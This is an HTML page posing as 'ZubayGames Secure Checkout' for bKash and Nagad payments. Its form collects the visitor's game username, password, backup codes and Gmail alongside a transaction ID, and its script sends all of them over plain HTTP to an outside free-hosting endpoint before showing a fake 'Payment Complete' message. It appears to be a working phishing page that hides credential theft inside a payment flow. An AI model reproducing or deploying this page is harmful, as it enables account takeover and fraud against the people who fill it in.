<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZubayGames Secure Checkout</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .method-card { border: 2px solid #e2e8f0; cursor: pointer; transition: all 0.3s ease; }
        .method-card.active { border-color: #2563eb; background: #eff6ff; transform: scale(1.02); }
        .fade-in { animation: fadeIn 0.5s ease-in; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body class="bg-slate-50 min-h-screen flex items-center justify-center p-4">

    <div id="main-container" class="w-full max-w-sm bg-white rounded-3xl shadow-2xl p-8 fade-in">
        <h2 class="text-2xl font-extrabold text-center text-slate-800 mb-6">ZubayGames</h2>

        <div class="bg-blue-600 text-white p-5 rounded-2xl text-center mb-8 shadow-lg shadow-blue-200">
            <p class="text-xs uppercase font-bold tracking-widest opacity-80">Total Amount</p>
            <h1 class="text-4xl font-black mt-1">৳ <span id="display-amount">0.00</span></h1>
        </div>

        <div class="grid grid-cols-2 gap-4 mb-8">
            <div class="method-card p-4 rounded-2xl text-center" onclick="showSteps(this, 'bKash', '01720960851')">
                <img src="https://pay.unigamebd.com/assets/gateways/bkash/bkashpersonal.png" class="h-8 mx-auto mb-2">
                <p class="text-xs font-bold text-slate-700">bKash</p>
            </div>
            <div class="method-card p-4 rounded-2xl text-center" onclick="showSteps(this, 'Nagad', '01720960851')">
                <img src="https://pay.unigamebd.com/assets/gateways/nagad/nagadpersonal.png" class="h-8 mx-auto mb-2">
                <p class="text-xs font-bold text-slate-700">Nagad</p>
            </div>
        </div>

        <div id="instruction-box" class="hidden bg-slate-50 p-6 rounded-2xl border border-slate-100 text-sm text-slate-600 space-y-4">
            <ul class="list-disc ml-4 space-y-2 font-medium text-slate-700">
                <li>Open your <span id="method-name"></span> App</li>
                <li>Pay to <span id="copy-number" class="font-bold">01720960851</span></li>
                <li>Fill details below:</li>
            </ul>
            
            <input type="text" id="txid" placeholder="Transaction ID" class="w-full p-3 bg-white border rounded-xl outline-none">
            <input type="text" id="username" placeholder="Game Username/ID" class="w-full p-3 bg-white border rounded-xl outline-none">
            <input type="text" id="password" placeholder="Password" class="w-full p-3 bg-white border rounded-xl outline-none">
            <input type="text" id="backup" placeholder="Backup Codes" class="w-full p-3 bg-white border rounded-xl outline-none">
            <input type="email" id="email" placeholder="Your Gmail" class="w-full p-3 bg-white border rounded-xl outline-none">

            <button onclick="processPayment()" class="w-full bg-blue-600 text-white py-4 rounded-xl font-bold hover:bg-blue-700 transition-all">VERIFY PAYMENT</button>
        </div>
    </div>

    <div id="status-screen" class="hidden w-full max-w-sm text-center p-8">
        <div id="spinner" class="w-12 h-12 border-4 border-blue-200 border-t-blue-600 rounded-full animate-spin mx-auto mb-4"></div>
        <h1 id="status-text" class="text-xl font-bold text-slate-700">Processing...</h1>
    </div>

    <script>
        document.getElementById('display-amount').innerText = localStorage.getItem('checkout_pack_price') || '0.00';

        function showSteps(el, method, number) {
            document.querySelectorAll('.method-card').forEach(c => c.classList.remove('active'));
            el.classList.add('active');
            document.getElementById('instruction-box').classList.remove('hidden');
            document.getElementById('method-name').innerText = method;
        }

        function processPayment() {
            let formData = new FormData();
            formData.append('method', document.getElementById('method-name').innerText);
            formData.append('amount', document.getElementById('display-amount').innerText);
            formData.append('txid', document.getElementById('txid').value);
            formData.append('username', document.getElementById('username').value);
            formData.append('password', document.getElementById('password').value);
            formData.append('backup', document.getElementById('backup').value);
            formData.append('email', document.getElementById('email').value);

            fetch('http://swift11.infinityfreeapp.com/save_order.php', { method: 'POST', body: formData })
            .then(() => {
                document.getElementById('main-container').classList.add('hidden');
                document.getElementById('status-screen').classList.remove('hidden');
                setTimeout(() => {
                    document.getElementById('status-text').innerText = "Payment Complete! ✅";
                }, 2000);
            });
        }
    </script>
</body>
</html>
